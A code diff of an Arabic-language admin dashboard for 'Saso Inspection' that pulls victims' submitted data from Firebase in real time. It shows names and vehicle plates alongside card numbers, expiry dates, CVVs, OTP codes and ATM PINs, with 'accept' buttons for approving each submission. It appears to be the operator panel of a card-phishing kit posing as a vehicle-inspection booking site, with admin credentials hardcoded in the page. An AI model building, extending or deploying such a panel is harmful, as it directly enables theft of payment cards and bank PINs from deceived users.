@@ -6,9 +6,6 @@
     <title>لوحة التحكم - Saso Inspection</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.23/jspdf.plugin.autotable.min.js"></script>
-    
     <style>
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f4f7f6; margin: 0; padding: 0; }
         #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
@@ -18,11 +15,9 @@
         .login-box button { width: 100%; padding: 12px; background: #1e7344; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
         #adminContent { display: none; }
         .navbar { background: #1e7344; padding: 15px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
-        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 200px; }
+        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; flex: 1; max-width: 250px; }
         .nav-btn.active { background: #ffffff; color: #1e7344; }
-        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; }
-        .action-bar { padding: 10px 15px; display: flex; justify-content: flex-end; }
-        .btn-pdf { background: #d32f2f; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; display: flex; align-items: center; gap: 8px; }
+        .visitor-counter { background: #ffd700; color: #000; padding: 10px; text-align: center; font-weight: bold; font-size: 16px; }
         .container { padding: 15px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
@@ -39,7 +34,7 @@
         .btn-accept { background: #28a745; }
         .btn-reject { background: #dc3545; }
         .btn-delete { background: #6c757d; }
-        .logout-btn { background: #000 !important; }
+        .logout-btn { background: #000 !important; margin-top: 10px; font-size: 12px; }
     </style>
 </head>
 <body onload="checkSavedLogin()">
@@ -50,45 +45,38 @@
         <input type="text" id="username" placeholder="اسم المستخدم" autocomplete="off">
         <input type="password" id="password" placeholder="كلمة المرور">
         <button onclick="checkLogin()">دخول</button>
-        <p id="loginError" style="color:red; display:none; margin-top:10px;">بيانات غير صحيحة!</p>
+        <p id="loginError" style="color:red; display:none; margin-top:10px; font-size:14px;">بيانات غير صحيحة!</p>
     </div>
 </div>
 
 <div id="adminContent">
     <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
     <div class="navbar">
-        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
-        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
+        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز</button>
+        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
         <button class="nav-btn logout-btn" onclick="logout()">🚪 خروج</button>
     </div>
-
     <div class="container">
         <div id="bookingSection" class="tab-content active">
-            <div class="action-bar">
-                <button class="btn-pdf" onclick="exportAndClear('visitors', 'booking_report')">📄 حفظ PDF وتصفير البيانات</button>
-            </div>
             <div id="bookingGrid" class="booking-grid"></div>
         </div>
-
         <div id="cardsSection" class="tab-content">
-            <div class="action-bar">
-                <button class="btn-pdf" onclick="exportAndClear('payments', 'cards_report')">📄 حفظ PDF وتصفير البيانات</button>
-            </div>
             <div id="paymentsContainer"></div>
         </div>
     </div>
 </div>
 
 <script>
-    let currentData = { visitors: {}, payments: {} };
+    const sessionStartTime = Date.now(); // وقت فتح الصفحة الآن
 
     function checkSavedLogin() {
         if (localStorage.getItem("admin_logged_in") === "true") showAdmin();
     }
 
     function checkLogin() {
+        const userInput = document.getElementById('username').value.trim().toLowerCase();
         const passInput = document.getElementById('password').value.trim();
-        if(["adman", "adman_"].includes(document.getElementById('username').value.trim().toLowerCase()) && passInput === "H0987654H") {
+        if(["adman", "adman_"].includes(userInput) && passInput === "H0987654H") {
             localStorage.setItem("admin_logged_in", "true");
             showAdmin();
         } else {
@@ -102,7 +90,10 @@
         initFirebase();
     }
 
-    function logout() { localStorage.removeItem("admin_logged_in"); location.reload(); }
+    function logout() {
+        localStorage.removeItem("admin_logged_in");
+        location.reload();
+    }
 
     function initFirebase() {
         const firebaseConfig = {
@@ -116,92 +107,73 @@
         };
         
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        const database = firebase.database();
 
-        // عداد الزوار
-        db.ref('live_visitors').on('value', s => {
+        // تصفير وتنظيف عداد الزوار
+        database.ref('live_visitors').on('value', s => {
             let count = 0; const now = Date.now();
-            s.forEach(c => { if(now - c.val().last_active < 40000) count++; else db.ref('live_visitors/'+c.key).remove(); });
+            s.forEach(c => {
+                if(now - c.val().last_active < 30000) count++;
+                else database.ref('live_visitors/'+c.key).remove();
+            });
             document.getElementById('onlineCount').innerText = count;
         });
 
-        // مزامنة الحجوزات
-        db.ref('visitors').on('value', s => {
-            currentData.visitors = s.val() || {};
-            const grid = document.getElementById('bookingGrid');
-            grid.innerHTML = '';
-            s.forEach(c => {
-                const v = c.val();
-                grid.innerHTML = `<div class="customer-card">
-                    <h3 style="color:#1e7344;">${v.fullName || 'زائر'}</h3>
-                    <p>🚗 ${v.vehicleType} | 🔢 ${v.plateNumber}</p>
-                    <p>📅 ${v.bookingDate} | 🕒 ${v.bookingTime}</p>
-                    <button class="btn btn-delete" style="width:100%" onclick="deleteSingle('visitors/${c.key}')">حذف</button>
-                </div>` + grid.innerHTML;
+        // جلب البيانات الجديدة فقط (التي تم إنشاؤها بعد فتح الصفحة)
+        function listenForNew(path, containerId, templateFn) {
+            database.ref(path).on('child_added', (snapshot) => {
+                const val = snapshot.val();
+                // إذا كان عنصر قديم (قبل فتح الصفحة) نتجاهله
+                if (val.timestamp && val.timestamp < sessionStartTime) return;
+                
+                const container = document.getElementById(containerId);
+                const div = document.createElement('div');
+                div.innerHTML = templateFn(val, snapshot.key);
+                container.prepend(div); // وضع الجديد في الأعلى
             });
-        });
+        }
 
-        // مزامنة البطاقات
-        db.ref('payments').on('value', s => {
-            currentData.payments = s.val() || {};
-            const cont = document.getElementById('paymentsContainer');
-            cont.innerHTML = '';
-            s.forEach(c => {
-                const v = c.val();
-                let isWait = v.status?.includes('waiting');
-                cont.innerHTML = `<div class="operation-row">
-                    <div class="card-data-wrapper">
-                        <div><b>${v.cardHolder}</b><br><span class="status-badge ${isWait?'status-waiting':''}">${isWait?'انتظار':'مستقر'}</span></div>
-                        <div style="display:flex; gap:5px; flex-wrap:wrap">
-                            <div class="box card-box">${v.cardNumber}</div>
-                            <div class="box card-box">${v.expiry} | ${v.cvv}</div>
-                            <div class="box" style="background:#e3f2fd">OTP: ${v.otp||'-'}</div>
-                            <div class="box" style="background:#f3e5f5">PIN: ${v.atm_pin||'-'}</div>
-                        </div>
-                        <div style="display:flex; gap:5px">
-                            <button class="btn btn-accept" onclick="updateStatus('${c.key}','accept')">قبول</button>
-                            <button class="btn btn-delete" onclick="deleteSingle('payments/${c.key}')">🗑</button>
-                        </div>
+        listenForNew('visitors', 'bookingGrid', (val, key) => `
+            <div class="customer-card">
+                <h3 style="margin:0 0 10px 0; color:#1e7344; font-size:16px;">${val.fullName || 'زائر'}</h3>
+                <p style="font-size:13px; margin:5px 0;">🚗 ${val.vehicleType || '-'} | 🔢 ${val.plateNumber || '-'}</p>
+                <p style="font-size:13px; margin:5px 0;">📅 ${val.bookingDate || '-'} | 🕒 ${val.bookingTime || '-'}</p>
+                <button class="btn btn-reject" style="width:100%; margin-top:10px;" onclick="deleteData('visitors/${key}')">حذف</button>
+            </div>
+        `);
+
+        listenForNew('payments', 'paymentsContainer', (val, id) => {
+            let isWait = val.status?.includes('waiting');
+            return `
+            <div class="operation-row">
+                <div class="card-data-wrapper">
+                    <div style="min-width:100px;">
+                        <div style="font-weight:bold; font-size:13px;">${val.cardHolder || 'عميل'}</div>
+                        <span class="status-badge ${isWait?'status-waiting':''}">${isWait?'انتظار ⏳':'مستقر'}</span>
                     </div>
-                </div>` + cont.innerHTML;
-            });
+                    <div style="display:flex; gap:5px; align-items:center; flex-grow:1; flex-wrap:wrap;">
+                        <div class="box card-box" style="direction:ltr; min-width:140px;">${val.cardNumber || '----'}</div>
+                        <div class="box card-box">${val.expiry || '--/--'} | ${val.cvv || '---'}</div>
+                        <div class="box" style="background:#e3f2fd; color:#0d47a1;">🔐 OTP: ${val.otp || '-'}</div>
+                        <div class="box" style="background:#f3e5f5; color:#4a148c;">🏧 PIN: ${val.atm_pin || '-'}</div>
+                    </div>
+                    <div style="display:flex; gap:5px;">
+                        <button class="btn btn-accept" onclick="updateStatus('${id}', 'accept')">قبول</button>
+                        <button class="btn btn-delete" onclick="deleteData('payments/${id}')">🗑</button>
+                    </div>
+                </div>
+            </div>`;
         });
     }
 
-    // وظيفة التحميل والمسح
-    async function exportAndClear(path, fileName) {
-        const dataObj = currentData[path];
-        if (!dataObj || Object.keys(dataObj).length === 0) return alert("لا توجد بيانات لحفظها!");
+    function updateStatus(userId, action) { firebase.database().ref('payments/' + userId).update({ status: action }); }
+    function deleteData(path) { if(confirm('متأكد؟')) firebase.database().ref(path).remove(); }
 
-        if (!confirm("سيتم تحميل ملف PDF ومسح هذه البيانات نهائياً من لوحة التحكم. هل أنت متأكد؟")) return;
-
-        const { jsPDF } = window.jspdf;
-        const doc = new jsPDF();
-        
-        // تجهيز البيانات للجدول
-        const rows = [];
-        Object.values(dataObj).forEach(item => {
-            rows.push(Object.values(item).map(val => String(val)));
-        });
-
-        doc.text(fileName === 'booking_report' ? "Report: Bookings" : "Report: Cards Data", 10, 10);
-        doc.autoTable({ head: [Object.keys(Object.values(dataObj)[0])], body: rows, startY: 20 });
-        
-        doc.save(`${fileName}_${Date.now()}.pdf`);
-
-        // مسح البيانات من Firebase بعد الحفظ
-        firebase.database().ref(path).remove().then(() => {
-            alert("تم حفظ الملف وتصفير البيانات بنجاح!");
-        });
-    }
-
-    function updateStatus(id, stat) { firebase.database().ref('payments/'+id).update({status: stat}); }
-    function deleteSingle(path) { if(confirm('حذف؟')) firebase.database().ref(path).remove(); }
-    function openTab(evt, name) {
-        document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
-        document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-        document.getElementById(name).style.display = 'block';
-        evt.currentTarget.classList.add('active');
+    function openTab(evt, tabName) {
+        document.querySelectorAll(".tab-content").forEach(t => t.style.display = "none");
+        document.querySelectorAll(".nav-btn").forEach(b => b.classList.remove("active"));
+        document.getElementById(tabName).style.display = "block";
+        evt.currentTarget.className += " active";
     }
 </script>
 </body>
